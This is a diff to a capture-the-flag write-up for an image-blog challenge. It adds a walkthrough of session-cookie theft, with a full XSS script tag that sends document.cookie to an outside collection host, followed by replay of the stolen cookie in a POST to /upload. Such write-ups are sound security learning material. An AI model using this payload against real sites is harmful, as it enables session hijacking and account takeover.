@@ -8,7 +8,7 @@ I found this amazing blog about Iceland! Did I ever tell you that I love Iceland
 
 ## Writeup
 
-(TODO)
+The description indicates the victim's machine is the intended target. From there, we can assume it has something to do with the backend / server portion of the challenge. After some looking around, the session cookie turns out to be the one vector really open to attack. To collect the cookie, use a website to collect the request like [requestbin](http://requestb.in/), and paste the following HTML tag into the DOM, so the browser executes it, and sends your cookeis to the requestbin server: `<script>image=new Image();image.src='http://a.b.c.d:40001/?'+document.cookie;</script>`. Next, find a request sender like [hurl.it](https://hurl.it) and send a POST request to `/upload` (you can find that by tracing an upload) with `HTTP/1.1`, the host `imgblog.vuln.icec.tf` with the session cookie you got in your request bin. 
 
 ## Other write-ups and resources
 
